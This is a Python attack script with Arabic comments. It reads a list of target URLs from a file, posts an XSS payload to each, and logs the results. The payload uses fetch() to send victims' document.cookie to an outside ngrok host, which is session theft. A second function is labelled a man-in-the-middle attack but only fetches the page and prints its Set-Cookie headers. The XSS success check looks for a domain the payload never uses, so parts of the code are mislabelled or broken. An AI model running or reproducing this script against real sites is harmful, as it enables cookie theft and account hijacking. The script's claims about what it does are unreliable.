import requests

# 1. دالة لاختبار XSS
def exploit_xss(target_url):
    # التأكد من أن الـ URL يحتوي على http:// أو https://
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url  # إضافة http:// افتراضيًا

    payload = "<script>fetch('https://51bf-82-205-9-77.ngrok-free.app/cookie?cookie=' + document.cookie);</script>"
    response = requests.post(target_url, data={'input': payload})
    if response.status_code == 200:
        print(f"XSS Payload sent to {target_url}")
        if "malicious-site.com" in response.text:
            print("XSS exploit successful!")
        else:
            print("XSS exploit failed.")
        log_result(f"XSS exploit sent to {target_url} with status {response.status_code}")
    else:
        print(f"Failed to send XSS payload to {target_url}. Status Code: {response.status_code}")

# 2. دالة للاعتراض Man-in-the-Middle
def intercept_traffic(target_url):
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url  # إضافة http:// افتراضيًا

    response = requests.get(target_url)
    if response.status_code == 200:
        print(f"Intercepting traffic for {target_url}...")
        if 'Set-Cookie' in response.headers:
            print(f"Cookies found: {response.headers['Set-Cookie']}")
            log_result(f"Cookies from {target_url}: {response.headers['Set-Cookie']}")
        else:
            print("No cookies found.")
    else:
        print(f"Failed to intercept traffic from {target_url}. Status Code: {response.status_code}")

# 3. دالة لتسجيل النتائج في ملف
def log_result(message):
    with open("exploit_results.txt", "a") as file:
        file.write(f"{message}\n")

# 4. دالة لقراءة URLs من ملف txt
def get_target_urls(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file.readlines()]

# 5. الدالة الرئيسية لتشغيل الهجمات
def run_exploits(file_path):
    target_urls = get_target_urls(file_path)
    for target_url in target_urls:
        print(f"Running XSS Exploit on {target_url}...")
        exploit_xss(target_url)
        
        print(f"Running MITM attack on {target_url}...")
        intercept_traffic(target_url)

if __name__ == "__main__":
    run_exploits('targets.txt')
